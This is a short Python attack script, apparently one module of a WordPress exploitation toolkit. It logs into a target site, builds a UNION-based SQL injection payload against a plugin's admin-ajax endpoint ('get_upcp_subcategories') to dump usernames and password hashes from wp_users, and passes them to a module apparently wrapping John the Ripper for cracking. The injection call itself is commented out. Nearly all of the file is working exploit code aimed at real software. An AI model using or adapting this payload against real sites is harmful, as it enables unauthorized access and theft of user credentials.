import LoginManager
import requests
import re
import csv
import SQLInj
import John

def attack(url):
    performLogin(url)
    attackUrl = url + "/wp-admin/admin-ajax.php?action=get_upcp_subcategories"
    headers = {'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost'}
    data = {"CatID": "0 UNION SELECT user_login,user_pass FROM wp_users WHERE ID>=0"}
    #SQLInj.attack(attackUrl,LoginManager.session,headers,data,",")
    John.attack()


def performLogin(url):
    username = input("\nInsert your username: ")
    password = input("Insert your password: ")
    result = LoginManager.login(url,username,password)
    while (not result):
        print("\nYour login failed, Username or password are wrong, insert them again")
        username = input("Insert your username: ")
        password = input("Insert your password: ")
        result = LoginManager.login(url, username, password)


